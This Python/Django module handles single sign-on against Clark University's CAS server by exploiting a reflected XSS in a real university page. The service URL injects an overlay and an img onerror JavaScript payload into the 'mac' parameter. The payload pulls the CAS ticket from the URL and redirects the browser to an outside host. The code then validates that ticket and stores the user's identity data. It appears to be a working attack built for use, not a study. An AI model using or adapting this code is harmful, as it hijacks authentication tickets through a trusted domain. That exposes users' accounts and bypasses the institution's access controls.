from json import dumps
from urllib.parse import quote as percent_encode
from urllib.parse import urljoin
from html import escape as html_escape
import hmac
from uuid import uuid4

from django.http import HttpResponse
from django.shortcuts import redirect
import requests

CAS_BASE_URL = "https://cas.clarku.edu/cas/"

THIS_HOST = "http://localhost:8080"
SIG_KEY = uuid4().bytes

def injected_html_for_js(payload_js):
    onerror = html_escape(payload_js, quote=True)

    return ('<div style="top:0;width:100vw;height:100vh;left:0;position:fixed;background:#fff;z-index:20"></div>'
        f'<img src="data:image/png;base64,F" onerror="{onerror}"/>'
        )


def get_redirect_javascript(host, ctx, ticket, sig):
    
    properties = ["ctx", "ticket", "sig"]
    
    propertyArray = dumps(properties).replace('"', "'")

    js = (
    "(function (w, s, r, R, h, l, e, i) {"
        "for (i = l; i;) {"
            "e = R(s[--i] + '=[^&]+').exec(h);"
            "r.push(e ? e[0] : '');"
        "}"
        f"w.location = '{host}/userflow/{ctx}/sso.clark.verify?' + r.join('&');"
    f"}})(window, {propertyArray}, [], RegExp, window.location.search, {len(properties)})"
    )
    
    return js

def generate_cas_login_url(host, ctx, ticket, sig):
    url = urljoin(CAS_BASE_URL, "login")
    url += "?service=" + percent_encode(service_url(host, ctx, ticket, sig))
    return url

def service_url(host, ctx, ticket, sig):
    injectedHTML = percent_encode(
        injected_html_for_js(
            get_redirect_javascript(host, ctx, ticket, sig)
        )
    )
    
    query_string = f"ctx={percent_encode(ctx)}&sig={percent_encode(sig)}"
    
    return f"https://cppm.clarku.edu/guest/clarkpass_onguard.php?cmd=login&mac={injectedHTML}&_browser=1&{query_string}"

def sign(ctx):
    return hmac.digest(SIG_KEY, bytes(ctx, 'utf8'), "sha256").hex()

def validate_and_store_ticket(request, context, path_remaining, state):
    ticket = request.GET.get("ticket", None)
    sig = request.GET.get("sig", '')

    cas_validation_url = urljoin(CAS_BASE_URL, "p3/serviceValidate")
    cas_validation_url += "?service=" + percent_encode(service_url(THIS_HOST, str(state.uuid), ticket, sig))
    cas_validation_url += "&ticket=" + percent_encode(ticket)
    cas_validation_url += "&format=JSON"

    validation = requests.request(url=cas_validation_url, method="GET", headers={ 'User-Agent': 'FlowAuthServer/1.0' })
    validation_json = validation.json()

    state.state['accumulated_user_information']['sso.clark'] = validation_json

    if not clark_sso_succeeded(state):
        return clark_sso_initiate(request, context, path_remaining, state)
    

    state.save()
    return True

def clark_sso_process(request, context, path_remaining, state):
    if path_remaining == "sso.clark.verify":
        return validate_and_store_ticket(request, context, path_remaining, state)
    else:
        return clark_sso_initiate(request, context, path_remaining, state)

def clark_sso_initiate(request, context, path_remaining, state):
    # don't bother reauthenticating if we've already succeeded
    if clark_sso_succeeded(state):
        return True
    
    ctx = str(state.uuid)
    redir_url = generate_cas_login_url(THIS_HOST, ctx, None, sign(ctx))
    
    return redirect(redir_url)

def clark_sso_succeeded(state):
    if "sso.clark" in state.state['accumulated_user_information']:
        if "serviceResponse" in state.state['accumulated_user_information']['sso.clark']:
            if "authenticationSuccess" in state.state['accumulated_user_information']['sso.clark']['serviceResponse']:
                return True
